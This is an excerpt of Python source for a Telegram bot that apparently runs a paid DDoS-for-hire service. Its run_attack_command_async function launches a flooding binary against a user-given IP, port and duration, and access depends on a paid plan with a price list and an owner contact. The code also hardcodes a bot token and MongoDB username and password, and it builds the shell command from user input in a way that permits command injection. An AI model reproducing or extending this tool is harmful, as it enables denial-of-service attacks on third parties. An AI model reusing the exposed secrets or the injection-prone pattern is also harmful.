...
TOKEN = '7824482923:AAEhhBo6hV3jAksNkYnVYDVoYayFK1FOn18'
MONGO_URI = 'mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
FORWARD_CHANNEL_ID = -1002297242691
CHANNEL_ID = -1002297242691
error_channel_id = -1002297242691
...
def create_inline_keyboard():
    ...
    button3 = types.InlineKeyboardButton(
        text="❤️‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤️‍🩹", url="https://t.me/+rzj8IlSLrB04YmI1")
    button1 = types.InlineKeyboardButton(text="👤 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 👤",
        url="https://t.me/LEGENDVIPOP")
    markup.add(button3)
    markup.add(button1)
    return markup
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./LEGEND {target_ip} {target_port} {duration} 10")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       ...
                                       "*Contact the owner for assistance: @LEGENDVIPOP.*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
    ...
    try:
        ...
        if not user_data:
            ...
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/LEGENDVIPOP")
            markup.add(button1)
            markup.add(button2)
        else:
            ...
            button = types.InlineKeyboardButton(
                text="❤️‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤️‍🩹", url="https://t.me/+4Cvk18KIzqA5MDU1")
            markup.add(button)
